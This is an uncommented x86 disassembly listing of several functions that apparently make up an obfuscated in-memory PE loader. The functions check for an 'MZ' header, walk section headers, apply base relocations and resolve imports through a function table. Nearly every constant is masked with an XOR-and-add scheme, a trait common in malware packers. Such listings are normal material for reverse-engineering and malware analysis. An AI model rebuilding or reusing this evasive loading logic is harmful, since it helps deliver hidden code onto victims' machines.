  41e7ca:	test   edi,edi
  41e7cc:	je     0x41e7f7
  41e7ce:	add    edi,DWORD PTR [ebp+0x8]
  41e7d1:	mov    DWORD PTR [ebp-0x10],edi
  41e7d4:	cmp    edi,eax
  41e7d6:	jbe    0x41e7e8
  41e7d8:	mov    ebx,DWORD PTR [ebp+0xc]
  41e7db:	mov    ebx,DWORD PTR [ebx+0x7c]
  41e7de:	add    ebx,eax
  41e7e0:	cmp    edi,ebx
  41e7e2:	jae    0x41e7e8
  41e7e4:	mov    esi,DWORD PTR [esi]
  41e7e6:	jmp    0x41e7f0
  41e7e8:	sub    edi,DWORD PTR [ebp+0x8]
  41e7eb:	mov    DWORD PTR [esi],edi
  41e7ed:	mov    esi,DWORD PTR [ebp-0x10]
  41e7f0:	test   esi,esi
  41e7f2:	je     0x41e802
  41e7f4:	mov    ebx,DWORD PTR [ebp-0x8]
  41e7f7:	inc    ebx
  41e7f8:	mov    DWORD PTR [ebp-0x8],ebx
  41e7fb:	cmp    ebx,DWORD PTR [ebp-0x4]
  41e7fe:	jb     0x41e7b8
  41e800:	jmp    0x41e789
  41e802:	xor    eax,eax
  41e804:	pop    edi
  41e805:	pop    esi
  41e806:	pop    ebx
  41e807:	leave  
  41e808:	ret    0x8
  41e80b:	push   ebp
  41e80c:	mov    ebp,esp
  41e80e:	sub    esp,0x2c
  41e811:	mov    edx,0xf89c8585
  41e816:	mov    DWORD PTR [ebp-0x4],edx
  41e819:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  41e820:	mov    eax,DWORD PTR [ebp-0x4]
  41e823:	mov    ecx,DWORD PTR [ebp-0x4]
  41e826:	mov    ecx,DWORD PTR [ebp-0x4]
  41e829:	mov    ecx,DWORD PTR [ebp-0x4]
  41e82c:	mov    ecx,DWORD PTR [ebp-0x4]
  41e82f:	mov    ecx,DWORD PTR [ebp-0x4]
  41e832:	push   ebx
  41e833:	mov    ebx,DWORD PTR [ebp+0x10]
  41e836:	push   esi
  41e837:	mov    esi,0x751089b
  41e83c:	mov    DWORD PTR [ebp-0x10],0x352eb0f
  41e843:	mov    ecx,DWORD PTR [ebp-0x4]
  41e846:	mov    ebx,DWORD PTR [ebx+0x190]
  41e84c:	push   edi
  41e84d:	mov    edi,0x3272e2
  41e852:	xor    ecx,esi
  41e854:	xor    eax,esi
  41e856:	add    eax,edi
  41e858:	add    ecx,edi
  41e85a:	mov    DWORD PTR [ebp-0x18],eax
  41e85d:	cmp    ecx,DWORD PTR [ebx]
  41e85f:	je     0x41eae0
  41e865:	mov    ebx,DWORD PTR [ebp-0x4]
  41e868:	mov    ecx,DWORD PTR [ebp+0xc]
  41e86b:	xor    ebx,esi
  41e86d:	add    ebx,edi
  41e86f:	cmp    ebx,ecx
  41e871:	je     0x41eae0
  41e877:	mov    ebx,DWORD PTR [ebp-0x4]
  41e87a:	mov    ecx,DWORD PTR [ecx+0x80]
  41e880:	xor    ebx,esi
  41e882:	add    ebx,edi
  41e884:	cmp    ecx,ebx
  41e886:	je     0x41eadb
  41e88c:	add    ecx,DWORD PTR [ebp+0x8]
  41e88f:	mov    DWORD PTR [ebp-0x2c],ecx
  41e892:	mov    ebx,edx
  41e894:	xor    ebx,esi
  41e896:	add    ebx,edi
  41e898:	mov    DWORD PTR [ebp-0x10],ebx
  41e89b:	mov    ebx,DWORD PTR [ebp-0x10]
  41e89e:	cmp    ebx,edx
  41e8a0:	je     0x41e8b4
  41e8a2:	mov    edx,DWORD PTR [ebp-0x10]
  41e8a5:	mov    ebx,DWORD PTR [ebp-0x4]
  41e8a8:	imul   edx,edx,0x14
  41e8ab:	xor    ebx,esi
  41e8ad:	add    ebx,edi
  41e8af:	cmp    DWORD PTR [edx+ecx*1],ebx
  41e8b2:	jne    0x41e8cb
  41e8b4:	mov    edx,DWORD PTR [ebp-0x10]
  41e8b7:	mov    ebx,DWORD PTR [ebp-0x4]
  41e8ba:	imul   edx,edx,0x14
  41e8bd:	xor    ebx,esi
  41e8bf:	add    ebx,edi
  41e8c1:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  41e8c5:	je     0x41eacd
  41e8cb:	mov    eax,DWORD PTR [ebp-0x4]
  41e8ce:	mov    ebx,DWORD PTR [ebp-0x4]
  41e8d1:	mov    eax,DWORD PTR [ebp-0x10]
  41e8d4:	imul   eax,eax,0x14
  41e8d7:	add    eax,ecx
  41e8d9:	mov    ecx,DWORD PTR [eax+0x10]
  41e8dc:	add    ecx,DWORD PTR [ebp+0x8]
  41e8df:	xor    ebx,esi
  41e8e1:	mov    DWORD PTR [ebp-0x1c],ecx
  41e8e4:	mov    ecx,DWORD PTR [ebp-0x4]
  41e8e7:	mov    edx,DWORD PTR [ebp-0x4]
  41e8ea:	xor    ecx,esi
  41e8ec:	add    ecx,edi
  41e8ee:	xor    edx,esi
  41e8f0:	mov    DWORD PTR [ebp-0x24],ecx
  41e8f3:	mov    ecx,DWORD PTR [eax]
  41e8f5:	add    edx,edi
  41e8f7:	add    ebx,edi
  41e8f9:	cmp    ecx,edx
  41e8fb:	je     0x41e903
  41e8fd:	add    ecx,DWORD PTR [ebp+0x8]
  41e900:	mov    DWORD PTR [ebp-0x24],ecx
  41e903:	mov    ecx,DWORD PTR [ebp-0x4]
  41e906:	xor    ecx,esi
  41e908:	add    ecx,DWORD PTR [eax+0xc]
  41e90b:	mov    eax,DWORD PTR [ebp+0x8]
  41e90e:	lea    eax,[ecx+eax*1+0x3272e2]
  41e915:	mov    DWORD PTR [ebp+0xc],eax
  41e918:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  41e91f:	mov    eax,DWORD PTR [ebp+0x10]
  41e922:	push   DWORD PTR [ebp+0xc]
  41e925:	mov    eax,DWORD PTR [eax+0x1d8]
  41e92b:	call   DWORD PTR [eax]
  41e92d:	mov    ecx,DWORD PTR [ebp-0x4]
  41e930:	xor    ecx,esi
  41e932:	add    ecx,edi
  41e934:	mov    DWORD PTR [ebp-0xc],eax
  41e937:	cmp    ecx,eax
  41e939:	jne    0x41e94d
  41e93b:	mov    eax,DWORD PTR [ebp+0x10]
  41e93e:	push   DWORD PTR [ebp+0xc]
  41e941:	mov    eax,DWORD PTR [eax+0x1d8]
  41e947:	call   DWORD PTR [eax+0xc]
  41e94a:	mov    DWORD PTR [ebp-0xc],eax
  41e94d:	mov    DWORD PTR [ebp-0x20],0x7f661b0c
  41e954:	mov    DWORD PTR [ebp-0x20],0xf89c999c
  41e95b:	mov    eax,DWORD PTR [ebp-0x4]
  41e95e:	xor    eax,esi
  41e960:	add    eax,edi
  41e962:	cmp    eax,DWORD PTR [ebp-0xc]
  41e965:	jne    0x41e98a
  41e967:	mov    eax,DWORD PTR [ebp-0x8]
  41e96a:	mov    ecx,DWORD PTR [ebp-0x20]
  41e96d:	xor    eax,esi
  41e96f:	xor    ecx,esi
  41e971:	lea    ebx,[ebx+eax*1+0x3272e2]
  41e978:	mov    eax,DWORD PTR [ebp+0x10]
  41e97b:	mov    eax,DWORD PTR [eax+0x1d8]
  41e981:	add    ecx,edi
  41e983:	imul   ecx,ebx
  41e986:	push   ecx
  41e987:	call   DWORD PTR [eax+0x24]
  41e98a:	mov    eax,DWORD PTR [ebp-0x4]
  41e98d:	xor    eax,esi
  41e98f:	add    eax,edi
  41e991:	cmp    eax,DWORD PTR [ebp-0xc]
  41e994:	jne    0x41e9a5
  41e996:	mov    eax,DWORD PTR [ebp-0x28]
  41e999:	xor    eax,esi
  41e99b:	add    eax,edi
  41e99d:	cmp    ebx,eax
  41e99f:	jbe    0x41e91f
  41e9a5:	mov    eax,DWORD PTR [ebp-0x4]
  41e9a8:	xor    eax,esi
  41e9aa:	add    eax,edi
  41e9ac:	cmp    eax,DWORD PTR [ebp-0xc]
  41e9af:	jne    0x41e9c8
  41e9b1:	mov    eax,DWORD PTR [ebp-0x8]
  41e9b4:	mov    ecx,DWORD PTR [ebp-0x18]
  41e9b7:	xor    eax,esi
  41e9b9:	lea    eax,[ecx+eax*1+0x3272e2]
  41e9c0:	mov    DWORD PTR [ebp-0x18],eax
  41e9c3:	jmp    0x41eab7
  41e9c8:	mov    DWORD PTR [ebp-0x14],0x1121b0d
  41e9cf:	mov    DWORD PTR [ebp+0xc],0xe042d0f
  41e9d6:	mov    ebx,DWORD PTR [ebp-0x4]
  41e9d9:	xor    ebx,esi
  41e9db:	add    ebx,edi
  41e9dd:	jmp    0x41eaa4
  41e9e2:	mov    eax,DWORD PTR [ebp-0x4]
  41e9e5:	xor    eax,esi
  41e9e7:	add    eax,edi
  41e9e9:	mov    DWORD PTR [ebp-0x14],eax
  41e9ec:	mov    eax,DWORD PTR [ebp-0x4]
  41e9ef:	xor    eax,esi
  41e9f1:	add    eax,edi
  41e9f3:	mov    DWORD PTR [ebp+0xc],eax
  41e9f6:	mov    ecx,DWORD PTR [ebp-0x4]
  41e9f9:	mov    eax,DWORD PTR [ebp-0x24]
  41e9fc:	xor    ecx,esi
  41e9fe:	add    ecx,edi
  41ea00:	cmp    ecx,eax
  41ea02:	je     0x41ea0a
  41ea04:	mov    eax,DWORD PTR [eax+ebx*4]
  41ea07:	mov    DWORD PTR [ebp-0x14],eax
  41ea0a:	mov    eax,DWORD PTR [ebp-0x1c]
  41ea0d:	mov    eax,DWORD PTR [eax+ebx*4]
  41ea10:	mov    DWORD PTR [ebp+0xc],eax
  41ea13:	mov    eax,DWORD PTR [ebp-0x4]
  41ea16:	mov    ecx,DWORD PTR [ebp-0x14]
  41ea19:	xor    eax,esi
  41ea1b:	add    eax,edi
  41ea1d:	cmp    eax,ecx
  41ea1f:	je     0x41ea4a
  41ea21:	mov    eax,DWORD PTR [ebp-0x4]
  41ea24:	mov    ecx,DWORD PTR [ebp-0x14]
  41ea27:	xor    eax,esi
  41ea29:	add    eax,edi
  41ea2b:	shr    ecx,0x1f
  41ea2e:	cmp    eax,ecx
  41ea30:	je     0x41ea4a
  41ea32:	mov    ecx,DWORD PTR [ebp-0x14]
  41ea35:	mov    eax,DWORD PTR [ebp+0x10]
  41ea38:	mov    eax,DWORD PTR [eax+0x1d8]
  41ea3e:	movzx  ecx,cx
  41ea41:	push   ecx
  41ea42:	push   DWORD PTR [ebp-0xc]
  41ea45:	call   DWORD PTR [eax+0x8]
  41ea48:	jmp    0x41ea63
  41ea4a:	mov    eax,DWORD PTR [ebp+0xc]
  41ea4d:	add    eax,DWORD PTR [ebp+0x8]
  41ea50:	mov    ecx,DWORD PTR [ebp+0x10]
  41ea53:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41ea59:	add    eax,0x2
  41ea5c:	push   eax
  41ea5d:	push   DWORD PTR [ebp-0xc]
  41ea60:	call   DWORD PTR [ecx+0x8]
  41ea63:	mov    DWORD PTR [ebp+0xc],eax
  41ea66:	mov    eax,DWORD PTR [ebp-0x4]
  41ea69:	mov    ecx,DWORD PTR [ebp+0xc]
  41ea6c:	xor    eax,esi
  41ea6e:	add    eax,edi
  41ea70:	cmp    eax,ecx
  41ea72:	mov    eax,DWORD PTR [ebp-0x8]
  41ea75:	jne    0x41ea88
  41ea77:	mov    ecx,DWORD PTR [ebp-0x18]
  41ea7a:	xor    eax,esi
  41ea7c:	lea    eax,[ecx+eax*1+0x3272e2]
  41ea83:	mov    DWORD PTR [ebp-0x18],eax
  41ea86:	jmp    0x41ea98
  41ea88:	mov    ecx,DWORD PTR [ebp+0xc]
  41ea8b:	xor    eax,esi
  41ea8d:	add    eax,edi
  41ea8f:	imul   eax,ecx
  41ea92:	mov    ecx,DWORD PTR [ebp-0x1c]
  41ea95:	mov    DWORD PTR [ecx+ebx*4],eax
  41ea98:	mov    eax,DWORD PTR [ebp-0x8]
  41ea9b:	xor    eax,esi
  41ea9d:	lea    ebx,[ebx+eax*1+0x3272e2]
  41eaa4:	mov    eax,DWORD PTR [ebp-0x4]
  41eaa7:	mov    ecx,DWORD PTR [ebp-0x1c]
  41eaaa:	xor    eax,esi
  41eaac:	add    eax,edi
  41eaae:	cmp    DWORD PTR [ecx+ebx*4],eax
  41eab1:	jne    0x41e9e2
  41eab7:	mov    edx,DWORD PTR [ebp-0x10]
  41eaba:	mov    eax,DWORD PTR [ebp-0x18]
  41eabd:	mov    ecx,DWORD PTR [ebp-0x2c]
  41eac0:	sub    edx,0x3272e1
  41eac6:	xor    edx,esi
  41eac8:	jmp    0x41e892
  41eacd:	mov    ecx,DWORD PTR [ebp-0x4]
  41ead0:	xor    ecx,esi
  41ead2:	add    ecx,edi
  41ead4:	cmp    eax,ecx
  41ead6:	mov    eax,DWORD PTR [ebp-0x4]
  41ead9:	jne    0x41eae3
  41eadb:	mov    eax,DWORD PTR [ebp-0x8]
  41eade:	jmp    0x41eae3
  41eae0:	mov    eax,DWORD PTR [ebp-0x4]
  41eae3:	xor    eax,esi
  41eae5:	add    eax,edi
  41eae7:	pop    edi
  41eae8:	pop    esi
  41eae9:	pop    ebx
  41eaea:	leave  
  41eaeb:	ret    0xc
  41eaee:	push   ebp
  41eaef:	mov    ebp,esp
  41eaf1:	sub    esp,0x28
  41eaf4:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41eafb:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  41eb02:	mov    eax,DWORD PTR [ebp+0xc]
  41eb05:	mov    DWORD PTR [ebp+0xc],eax
  41eb08:	push   esi
  41eb09:	mov    eax,eax
  41eb0b:	mov    eax,DWORD PTR [ebp-0x4]
  41eb0e:	mov    esi,DWORD PTR [ebp+0x8]
  41eb11:	mov    ecx,0x751089b
  41eb16:	xor    eax,ecx
  41eb18:	mov    edx,0x3272e2
  41eb1d:	add    eax,edx
  41eb1f:	cmp    esi,eax
  41eb21:	je     0x41ec48
  41eb27:	mov    eax,DWORD PTR [ebp+0x8]
  41eb2a:	mov    esi,DWORD PTR [ebp+0x8]
  41eb2d:	add    esi,DWORD PTR [eax+0x3c]
  41eb30:	push   edi
  41eb31:	mov    DWORD PTR [ebp+0xc],esi
  41eb34:	mov    DWORD PTR [ebp-0x1c],0xf89c85b8
  41eb3b:	mov    eax,DWORD PTR [ebp-0x1c]
  41eb3e:	mov    esi,DWORD PTR [ebp-0x4]
  41eb41:	mov    edi,DWORD PTR [ebp+0xc]
  41eb44:	xor    esi,ecx
  41eb46:	xor    eax,ecx
  41eb48:	add    esi,edx
  41eb4a:	cmp    DWORD PTR [edi+eax*8+0x1939788],esi
  41eb51:	je     0x41ec42
  41eb57:	mov    esi,DWORD PTR [ebp+0xc]
  41eb5a:	mov    eax,DWORD PTR [ebp+0x8]
  41eb5d:	add    eax,DWORD PTR [esi+0xa0]
  41eb63:	mov    esi,DWORD PTR [ebp+0x8]
  41eb66:	mov    edi,DWORD PTR [ebp+0xc]
  41eb69:	sub    esi,DWORD PTR [edi+0x34]
  41eb6c:	mov    edi,DWORD PTR [ebp-0x4]
  41eb6f:	xor    edi,ecx
  41eb71:	add    edi,edx
  41eb73:	mov    DWORD PTR [ebp-0x24],esi
  41eb76:	cmp    esi,edi
  41eb78:	je     0x41ec42
  41eb7e:	mov    esi,DWORD PTR [ebp-0x4]
  41eb81:	xor    esi,ecx
  41eb83:	add    esi,edx
  41eb85:	mov    DWORD PTR [ebp-0x8],esi
  41eb88:	push   ebx
  41eb89:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  41eb90:	jmp    0x41ec2c
  41eb95:	mov    esi,DWORD PTR [ebp-0x4]
  41eb98:	xor    esi,ecx
  41eb9a:	lea    edi,[ebx-0x8]
  41eb9d:	add    esi,edx
  41eb9f:	shr    edi,1
  41eba1:	cmp    esi,edi
  41eba3:	jae    0x41ec12
  41eba5:	sub    edi,esi
  41eba7:	lea    ebx,[eax+esi*2+0x8]
  41ebab:	mov    DWORD PTR [ebp-0x18],edi
  41ebae:	movzx  esi,WORD PTR [ebx]
  41ebb1:	and    esi,0xfff
  41ebb7:	mov    DWORD PTR [ebp-0x14],esi
  41ebba:	mov    edi,DWORD PTR [ebp-0x14]
  41ebbd:	mov    esi,DWORD PTR [eax]
  41ebbf:	sub    esi,edx
  41ebc1:	add    edi,esi
  41ebc3:	movzx  esi,WORD PTR [ebx]
  41ebc6:	shr    esi,0xc
  41ebc9:	xor    edi,ecx
  41ebcb:	mov    DWORD PTR [ebp-0x20],edi
  41ebce:	mov    DWORD PTR [ebp-0x14],esi
  41ebd1:	mov    esi,DWORD PTR [ebp-0x20]
  41ebd4:	mov    edi,DWORD PTR [ebp+0x8]
  41ebd7:	xor    esi,ecx
  41ebd9:	lea    esi,[esi+edi*1+0x3272e2]
  41ebe0:	mov    DWORD PTR [ebp-0x20],esi
  41ebe3:	mov    esi,DWORD PTR [ebp-0x10]
  41ebe6:	mov    edi,DWORD PTR [ebp-0x14]
  41ebe9:	xor    esi,ecx
  41ebeb:	add    esi,edx
  41ebed:	cmp    edi,esi
  41ebef:	jne    0x41ec07
  41ebf1:	mov    esi,DWORD PTR [ebp-0x10]
  41ebf4:	mov    edi,DWORD PTR [ebp-0x14]
  41ebf7:	xor    esi,ecx
  41ebf9:	add    esi,edx
  41ebfb:	cmp    edi,esi
  41ebfd:	jne    0x41ec07
  41ebff:	mov    esi,DWORD PTR [ebp-0x20]
  41ec02:	mov    edi,DWORD PTR [ebp-0x24]
  41ec05:	add    DWORD PTR [esi],edi
  41ec07:	add    ebx,0x2
  41ec0a:	dec    DWORD PTR [ebp-0x18]
  41ec0d:	jne    0x41ebae
  41ec0f:	mov    ebx,DWORD PTR [ebp-0xc]
  41ec12:	add    DWORD PTR [ebp-0x8],ebx
  41ec15:	mov    esi,DWORD PTR [ebp-0x1c]
  41ec18:	mov    edi,DWORD PTR [ebp-0x8]
  41ec1b:	mov    ebx,DWORD PTR [ebp+0xc]
  41ec1e:	xor    esi,ecx
  41ec20:	cmp    edi,DWORD PTR [ebx+esi*8+0x193978c]
  41ec27:	jae    0x41ec41
  41ec29:	add    eax,DWORD PTR [ebp-0xc]
  41ec2c:	mov    esi,DWORD PTR [ebp-0x4]
  41ec2f:	mov    ebx,DWORD PTR [eax+0x4]
  41ec32:	xor    esi,ecx
  41ec34:	add    esi,edx
  41ec36:	mov    DWORD PTR [ebp-0xc],ebx
  41ec39:	cmp    ebx,esi
  41ec3b:	jne    0x41eb95
  41ec41:	pop    ebx
  41ec42:	mov    eax,DWORD PTR [ebp-0x28]
  41ec45:	pop    edi
  41ec46:	jmp    0x41ec4b
  41ec48:	mov    eax,DWORD PTR [ebp-0x4]
  41ec4b:	xor    eax,ecx
  41ec4d:	add    eax,edx
  41ec4f:	pop    esi
  41ec50:	leave  
  41ec51:	ret    0x8
  41ec54:	push   ebp
  41ec55:	mov    ebp,esp
  41ec57:	sub    esp,0xcc
  41ec5d:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41ec64:	mov    DWORD PTR [ebp-0x24],0xf89c8584
  41ec6b:	mov    eax,DWORD PTR [ebp-0x4]
  41ec6e:	push   ebx
  41ec6f:	push   esi
  41ec70:	mov    esi,0x751089b
  41ec75:	xor    eax,esi
  41ec77:	push   edi
  41ec78:	mov    edi,0x3272e2
  41ec7d:	add    eax,edi
  41ec7f:	mov    DWORD PTR [ebp-0x1c],eax
  41ec82:	mov    eax,DWORD PTR [ebp-0x4]
  41ec85:	xor    eax,esi
  41ec87:	add    eax,edi
  41ec89:	mov    DWORD PTR [ebp-0x8],eax
  41ec8c:	mov    ebx,DWORD PTR [ebp+0x20]
  41ec8f:	mov    eax,DWORD PTR [ebp-0x14]
  41ec92:	mov    ecx,DWORD PTR [ebp-0x14]
  41ec95:	xor    eax,ecx
  41ec97:	mov    DWORD PTR [ebp-0x14],eax
  41ec9a:	add    DWORD PTR [ebp-0x14],0xf89cb585
  41eca1:	mov    eax,DWORD PTR [ebp-0xc]
  41eca4:	mov    ecx,DWORD PTR [ebp-0xc]
  41eca7:	xor    eax,ecx
  41eca9:	mov    DWORD PTR [ebp-0xc],eax
  41ecac:	add    DWORD PTR [ebp-0xc],0xf89c85c5
  41ecb3:	mov    eax,DWORD PTR [ebp-0x10]
  41ecb6:	mov    ecx,DWORD PTR [ebp-0x10]
  41ecb9:	xor    eax,ecx
  41ecbb:	mov    DWORD PTR [ebp-0x10],eax
  41ecbe:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  41ecc5:	mov    eax,DWORD PTR [ebp-0x20]
  41ecc8:	mov    ecx,DWORD PTR [ebp-0x20]
  41eccb:	xor    eax,ecx
  41eccd:	mov    DWORD PTR [ebp-0x20],eax
  41ecd0:	add    DWORD PTR [ebp-0x20],0xf89f0585
  41ecd7:	mov    eax,0x9471
  41ecdc:	mov    WORD PTR [ebp+0x20],ax
  41ece0:	mov    eax,DWORD PTR [ebp+0x8]
  41ece3:	test   eax,eax
  41ece5:	je     0x41f140
  41eceb:	mov    eax,DWORD PTR [ebp+0xc]
  41ecee:	test   eax,eax
  41ecf0:	je     0x41f140
  41ecf6:	mov    eax,DWORD PTR [ebp+0x18]
  41ecf9:	test   eax,eax
  41ecfb:	je     0x41f140
  41ed01:	mov    ax,WORD PTR [ebp+0x20]
  41ed05:	mov    ecx,0x8a8d
  41ed0a:	xor    ax,cx
  41ed0d:	mov    ecx,0x3b51
  41ed12:	add    ax,cx
  41ed15:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed18:	cmp    WORD PTR [ecx],ax
  41ed1b:	jne    0x41f140
  41ed21:	mov    eax,DWORD PTR [ebp-0x4]
  41ed24:	xor    eax,esi
  41ed26:	add    eax,edi
  41ed28:	mov    DWORD PTR [ebp-0x30],eax
  41ed2b:	mov    eax,DWORD PTR [ebp-0x4]
  41ed2e:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed31:	mov    eax,DWORD PTR [ebp+0x8]
  41ed34:	add    eax,DWORD PTR [ecx+0x3c]
  41ed37:	mov    DWORD PTR [ebp+0xc],eax
  41ed3a:	mov    eax,DWORD PTR [eax+0x50]
  41ed3d:	test   eax,eax
  41ed3f:	je     0x41f140
  41ed45:	mov    DWORD PTR [ebp-0x2c],0xf88c8585
  41ed4c:	mov    eax,DWORD PTR [ebp-0x2c]
  41ed4f:	xor    eax,esi
  41ed51:	add    eax,edi
  41ed53:	mov    DWORD PTR [ebp-0x2c],eax
  41ed56:	mov    eax,DWORD PTR [ebp-0x4]
  41ed59:	mov    eax,DWORD PTR [ebx+0x190]
  41ed5f:	mov    ecx,DWORD PTR [eax]
  41ed61:	mov    ecx,DWORD PTR [ecx+0x3c]
  41ed64:	add    ecx,DWORD PTR [eax]
  41ed66:	mov    eax,DWORD PTR [ebp-0x4]
  41ed69:	mov    eax,DWORD PTR [ebx+0x18c]
  41ed6f:	mov    edx,DWORD PTR [eax]
  41ed71:	mov    DWORD PTR [ebp-0x18],ecx
  41ed74:	mov    DWORD PTR [ebp+0x20],edx
  41ed77:	cmp    edx,edx
  41ed79:	jne    0x41edad
  41ed7b:	mov    eax,DWORD PTR [ebx+0x1d8]
  41ed81:	lea    edx,[ebp-0x1c]
  41ed84:	push   edx
  41ed85:	mov    edx,DWORD PTR [ebp-0xc]
  41ed88:	xor    edx,esi
  41ed8a:	add    edx,edi
  41ed8c:	push   edx
  41ed8d:	push   DWORD PTR [ecx+0x50]
  41ed90:	push   DWORD PTR [ebp+0x20]
  41ed93:	call   DWORD PTR [eax+0x1c]
  41ed96:	mov    eax,DWORD PTR [ebp-0x18]
  41ed99:	mov    ecx,DWORD PTR [eax+0x54]
  41ed9c:	mov    eax,DWORD PTR [eax+0x50]
  41ed9f:	sub    eax,ecx
  41eda1:	add    ecx,DWORD PTR [ebp+0x20]
  41eda4:	push   ecx
  41eda5:	call   0x41f72c
  41edaa:	mov    edx,DWORD PTR [ebp+0x20]
  41edad:	mov    eax,DWORD PTR [ebx+0x194]
  41edb3:	mov    DWORD PTR [eax],edx
  41edb5:	mov    eax,DWORD PTR [ebp+0xc]
  41edb8:	push   DWORD PTR [eax+0x54]
  41edbb:	push   DWORD PTR [ebp+0x8]
  41edbe:	push   edx
  41edbf:	call   0x41f5d3
  41edc4:	mov    ecx,DWORD PTR [ebp+0x20]
  41edc7:	mov    eax,DWORD PTR [ecx+0x3c]
  41edca:	add    eax,ecx
  41edcc:	movzx  ecx,WORD PTR [eax+0x14]
  41edd0:	lea    ecx,[ecx+eax*1+0x18]
  41edd4:	mov    DWORD PTR [ebp+0x18],ecx
  41edd7:	mov    ecx,DWORD PTR [ebp-0x4]
  41edda:	movzx  edx,WORD PTR [eax+0x6]
  41edde:	xor    ecx,esi
  41ede0:	add    ecx,edi
  41ede2:	mov    DWORD PTR [ebp+0xc],eax
  41ede5:	cmp    edx,ecx
  41ede7:	je     0x41ee94
  41eded:	mov    ecx,DWORD PTR [ebp-0x4]
  41edf0:	xor    ecx,esi
  41edf2:	add    ecx,edi
  41edf4:	mov    DWORD PTR [ebp-0x8],ecx
  41edf7:	mov    ecx,DWORD PTR [ebp-0x24]
  41edfa:	movzx  edx,WORD PTR [eax+0x6]
  41edfe:	xor    ecx,esi
  41ee00:	sub    edx,ecx
  41ee02:	sub    edx,edi
  41ee04:	cmp    DWORD PTR [ebp-0x8],edx
  41ee07:	ja     0x41ee94
  41ee0d:	mov    edx,DWORD PTR [ebp+0x18]
  41ee10:	add    edx,0x8
  41ee13:	mov    DWORD PTR [ebp+0x18],edx
  41ee16:	jmp    0x41ee1b
  41ee18:	mov    edx,DWORD PTR [ebp+0x18]
  41ee1b:	mov    eax,DWORD PTR [eax+0x38]
  41ee1e:	lea    ecx,[eax-0x1]
  41ee21:	mov    DWORD PTR [ebp-0x34],eax
  41ee24:	mov    eax,DWORD PTR [edx]
  41ee26:	test   ecx,eax
  41ee28:	je     0x41ee31
  41ee2a:	not    ecx
  41ee2c:	and    eax,ecx
  41ee2e:	add    eax,DWORD PTR [ebp-0x34]
  41ee31:	mov    ecx,DWORD PTR [edx+0x4]
  41ee34:	add    ecx,DWORD PTR [ebp+0x20]
  41ee37:	push   ecx
  41ee38:	call   0x41f72c
  41ee3d:	mov    edx,DWORD PTR [ebp-0x4]
  41ee40:	mov    eax,DWORD PTR [ebp+0x18]
  41ee43:	mov    ecx,DWORD PTR [eax+0x8]
  41ee46:	xor    edx,esi
  41ee48:	add    edx,edi
  41ee4a:	cmp    ecx,edx
  41ee4c:	je     0x41ee65
  41ee4e:	push   ecx
  41ee4f:	mov    ecx,DWORD PTR [ebp+0x8]
  41ee52:	add    ecx,DWORD PTR [eax+0xc]
  41ee55:	mov    eax,DWORD PTR [eax+0x4]
  41ee58:	add    eax,DWORD PTR [ebp+0x20]
  41ee5b:	push   ecx
  41ee5c:	push   eax
  41ee5d:	call   0x41f5d3
  41ee62:	mov    eax,DWORD PTR [ebp+0x18]
  41ee65:	mov    ecx,DWORD PTR [ebp-0x24]
  41ee68:	mov    edx,DWORD PTR [ebp-0x8]
  41ee6b:	add    eax,0x28
  41ee6e:	xor    ecx,esi
  41ee70:	lea    ecx,[edx+ecx*1+0x3272e2]
  41ee77:	mov    edx,DWORD PTR [ebp+0xc]
  41ee7a:	mov    DWORD PTR [ebp+0x18],eax
  41ee7d:	mov    eax,DWORD PTR [ebp-0x24]
  41ee80:	movzx  edx,WORD PTR [edx+0x6]
  41ee84:	xor    eax,esi
  41ee86:	sub    edx,eax
  41ee88:	mov    eax,DWORD PTR [ebp+0xc]
  41ee8b:	sub    edx,edi
  41ee8d:	mov    DWORD PTR [ebp-0x8],ecx
  41ee90:	cmp    ecx,edx
  41ee92:	jbe    0x41ee18
  41ee94:	mov    edx,DWORD PTR [ebx+0x18c]
  41ee9a:	mov    ecx,DWORD PTR [ebp+0x20]
  41ee9d:	cmp    ecx,DWORD PTR [edx]
  41ee9f:	jne    0x41eec8
  41eea1:	mov    eax,DWORD PTR [ebx+0x1d8]
  41eea7:	lea    edx,[ebp-0x1c]
  41eeaa:	push   edx
  41eeab:	mov    edx,DWORD PTR [ebp-0x10]
  41eeae:	xor    edx,esi
  41eeb0:	add    edx,edi
  41eeb2:	push   edx
  41eeb3:	mov    edx,DWORD PTR [ebp-0x18]
  41eeb6:	push   DWORD PTR [edx+0x54]
  41eeb9:	push   ecx
  41eeba:	call   DWORD PTR [eax+0x1c]
  41eebd:	test   eax,eax
  41eebf:	je     0x41f131
  41eec5:	mov    eax,DWORD PTR [ebp+0xc]
  41eec8:	mov    ecx,DWORD PTR [ebx+0x1c8]
  41eece:	mov    ecx,DWORD PTR [ecx]
  41eed0:	xor    ecx,esi
  41eed2:	add    ecx,edi
  41eed4:	je     0x41f05c
  41eeda:	and    DWORD PTR [ebp-0x28],0x0
  41eede:	and    DWORD PTR [ebp+0x8],0x0
  41eee2:	mov    eax,0xf89c8519
  41eee7:	lea    ecx,[eax-0x8]
  41eeea:	mov    DWORD PTR [ebp-0x4c],0xf89c8517
  41eef1:	mov    DWORD PTR [ebp-0x48],0xf89c8509
  41eef8:	mov    DWORD PTR [ebp-0x44],eax
  41eefb:	mov    DWORD PTR [ebp-0x40],ecx
  41eefe:	mov    DWORD PTR [ebp-0x3c],ecx
  41ef01:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  41ef08:	mov    edx,DWORD PTR [ebp+0x8]
  41ef0b:	mov    ecx,0x89b
  41ef10:	xor    cx,WORD PTR [ebp+edx*4-0x4c]
  41ef15:	mov    edx,0x72e2
  41ef1a:	add    cx,dx
  41ef1d:	mov    edx,DWORD PTR [ebp+0x8]
  41ef20:	inc    DWORD PTR [ebp+0x8]
  41ef23:	cmp    DWORD PTR [ebp+0x8],0x6
  41ef27:	mov    WORD PTR [ebp+edx*2-0xb4],cx
  41ef2f:	jb     0x41ef08
  41ef31:	mov    ecx,0xf89c850b
  41ef36:	mov    DWORD PTR [ebp-0xa4],eax
  41ef3c:	mov    DWORD PTR [ebp-0x90],eax
